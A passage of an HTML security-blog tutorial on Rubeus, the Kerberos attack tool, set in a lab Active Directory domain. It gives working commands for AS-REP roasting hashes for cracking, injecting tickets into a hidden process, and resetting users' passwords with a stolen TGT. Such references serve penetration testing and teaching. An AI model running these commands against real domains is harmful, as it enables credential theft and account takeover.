+<p><span style="color: #000000;">These hashes can be dumped in <strong data-start="3800" data-end="3818">Hashcat format</strong>, or cracked using <strong data-start="3837" data-end="3862">John the Ripper (JtR)</strong> by default:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /format:hashcat</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjuzZFYvdyjmSuLCVCFSeE0DzQsWRGWst6-07B3fM6OhJC_ynL1SYUnjeuDiK2_21T0CBR85qRc-Vk_kuLZCiRNjxNihNPRkXtFxPl4zYemQ0feJDhib8zhRjFMCQkSyuOIB4OkGbeaj3EaYUp9qKiVkH_3lWK093sxHMtpZUh6sCfcWuoyCDR_1y6EXw/s16000/45.png" alt="Rubeus Guide" width="826" height="537"/></span></p>
+<p><span style="color: #000000;">Optionally, use/domain and /dc to define the <strong data-start="4018" data-end="4028">domain</strong> and <strong data-start="4033" data-end="4054">domain controller</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asreproast /domain:ignite.local /dc:dc1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgU5K76cQsIuSu9GrxN3vgUKqkJUU___OkYGcPdp7Hd7u2JxvSeRWBE-OF0jLxWzqHLe-KOaKtnWxtRg6CZGH0J9Lm52J6vtH-m-8NyBH3WS-4_qyshTvp-mHPSaBQIyB81lg7tr4uXN4qEN3AEoSx531T9Voco3yD_U4tmfLQEUtMlbULzoA8_dQ4dmg/s16000/46.png"/></span></p>
+<p><span style="color: #000000;">Also, use /outfile to save the dumped hashes to a file:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asreproast /spn:ldap/dc1.ignite.local/ignite.local /outfile:type2.hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAmwIPnXN2_pehKSFN13XmPFM9Qs5lG1rPdC6QwVHaYi-1eadfLXXxvfyxx9cfgqu2Vo-Pq-tdWFdCN0Um04hqWsebRFGOU8P_coOeU5SUlgRVjZQe2uJHepN3GxCxqtwjzdSsdQdkvlggWxWFB2lhCB8KgleuEiPNiLCz5NJ4w76KtI_1rBotxC8Qww/s16000/47.png"/></span></p>
+<p><span style="color: #000000;">Finally, If you enable /ldaps, LDAP queries will go over <strong data-start="4327" data-end="4353">secure LDAP (port 636)</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe asreproast /user:harshitrajpal /ldaps</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEicLWjJ9T54E7EuA6kTlhxQM8rPoFBs5IFXBrln66dSaa40ah7Vzqlnfi1aFoylz4BwNSMl9jmuOcN-wO5HSLrKw-_ktEzrbY5-7BY-Im5AwHrAgJLLeszFR5pAXhmyiVE9VRRlj-eY1TjNlryOK7HvNXGWT6mDotM_eltYvtqjZCvFMpiMLwTcqQcTTA/s16000/48.png" alt="Rubeus Guide" width="696" height="560"/></span></p>
+<h3><span style="color: #800000;">Createnetonly</span></h3>
+<p><span style="color: #000000;">The /createnetonly option uses the <strong data-start="4475" data-end="4508">CreateProcessWithLogonW() API</strong> to create a new <strong data-start="4525" data-end="4543">hidden process</strong>, returning its <strong data-start="4559" data-end="4579">Process ID (PID)</strong> and <strong data-start="4584" data-end="4592">LUID</strong>. You can then use this <strong data-start="4616" data-end="4624">LUID</strong> with /ptt to apply a <strong data-start="4648" data-end="4667">Kerberos ticket</strong> to the new process.</span></p>
+<p><span style="color: #000000;">Use the /ticket flag to inject a <strong data-start="4729" data-end="4745">kirbi ticket</strong> or <strong data-start="4749" data-end="4764">base64 blob</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe createnetonly /program:"C:\Windows\System32\upnpcont.exe" /ticket:ticket.kirbi</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3FKa6ls_-29lSqgyft6xtWHX1Ej2Oj3qNBd6gcRL6ZWHAWHGJUU87S1-kwukPM_ENXC8w6gmapxAM25l75AJwJY3gMds-L0JwtbHNZhwseCLcOFtBWNfn5FCSLZibEsX8UbPoBmaGqCcHmlpEDl9FgtoTlk2DAKM5Fon6Y3tyJXUS11HHTFFjlhqGhA/s16000/49.png"/></span></p>
+<p><span style="color: #000000;">As you can see, the process ID3032 has been assigned to this hidden process, and the <strong data-start="4954" data-end="4962">LUID</strong> can be used via the /luid flag.</span></p>
+<h3><span style="color: #800000;">Changepw</span></h3>
+<p><span style="color: #000000;">The <strong>changepw</strong> option allows an attacker to <strong data-start="5061" data-end="5089">change a user’s password</strong> using a <strong data-start="5098" data-end="5117">TGT .kirbi file</strong> or a <strong data-start="5123" data-end="5138">base64 blob</strong>. When used with<strong>/tgtdeleg</strong> or /asktgt, it changes the password just from the <strong data-start="5219" data-end="5232">user hash</strong>. For example:</span></p>
+<p><span style="color: #000000;">/ticket: we provided valid TGT of current user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe changepw /ticket:doIFNDCC...bA== /new:Password@1!!!</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiHCPfcjKZuep_bsOMeMHhXWd8kT7ZeDlaXlBGHjRflEVXmRtBZPU0BD_RLJGcecu3rcR_zQ1kw_LNpYltwob_GdcoAZeuXP-vYV0KHwWe5r0snAonRtIbyIB2v689p97fe3211gyxUB8E1VyC-x8jQqDXbHNewLva59ZCzgRiOpnj2s0xUi4NBwUiWmw/s16000/50.png" alt="Rubeus Guide" width="883" height="633"/></span></p>
+<p><span style="color: #000000;">As shown, the password for user <strong>harshitrajpal</strong> has been successfully changed.</span></p>
+<p><span style="color: #000000;">You can also change the password of a <strong data-start="5443" data-end="5458">target user</strong> with the same credentials using <strong>/targetuser</strong> (typically found via brute-force):</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe changepw /targetuser:ignite.local\mufasa /ticket:doIFNDCC...bA== /new:Password@1!!!</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgaRfmzU-7AOrIeF7uWsr7UsnmMxx_MyAt2GwbvBN_bGLMQlwMB4nDeuim8TmvtdLXbxqpNe41akjFa4MJBVtU6rHxNJ1X2Ux01bpt9eFg2PVE2AcV7gE9AiLsJ1Y3rB-bF_2h-hFiqJxL5UsgOOSwrkzFJq3QDKVuhrNef1KlV-76kN1i-TfDVFjt5lw/s16000/51.png"/></span></p>
+<p><span style="color: #000000;">Here, <strong data-start="5651" data-end="5661">Mufasa</strong> had the same password and his password has now changed as well.</span></p>
+<h3><span style="color: #800000;">Currentluid</span></h3>
+<p><span style="color: #000000;">This simple option displays the <strong data-start="5781" data-end="5797">current LUID</strong>, which you can then reuse with other <strong data-start="5835" data-end="5853">Rubeus options</strong>, such as purging a ticket for a specific user:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rubeus.exe currentluid</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYNYxL8Nxhbmw4Sh8RLN9ioPlyAzGrNhjKkXlIjKo4mGLgCoV1gjdSA02lXPKTsipsVp2armNhdtsUKpZjXh2OPzVwagCLoBux_Z5XXH4WAGLEJLuIPxPqIewbx877l-XMItna27k892C5VKxSuolCUoYLb_HlwJjYRbR14kXhyRhrbrItpQaPX4GPSA/s16000/52.png" alt="Rubeus Guide" width="425" height="274"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">This article explored <strong data-start="5977" data-end="5987">Rubeus</strong>, a <strong data-start="5991" data-end="6012">C# implementation</strong> of many <strong data-start="6021" data-end="6049">Active Directory attacks</strong> seen in tools like <strong data-start="6069" data-end="6078">Kekeo</strong>. As a powerful post-exploitation tool, an attacker can drop Rubeus on a victim’s machine to execute a variety of Kerberos-based attacks. We tried to cover a majority of options. For a detailed wiki, refer to it <span style="color: #3366ff;"><a style="color: #3366ff;" href="https://github.com/GhostPack/Rubeus"><strong>here</strong></a></span>. The author intends the article to serve as a quick, ready reference for Rubeus usage. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
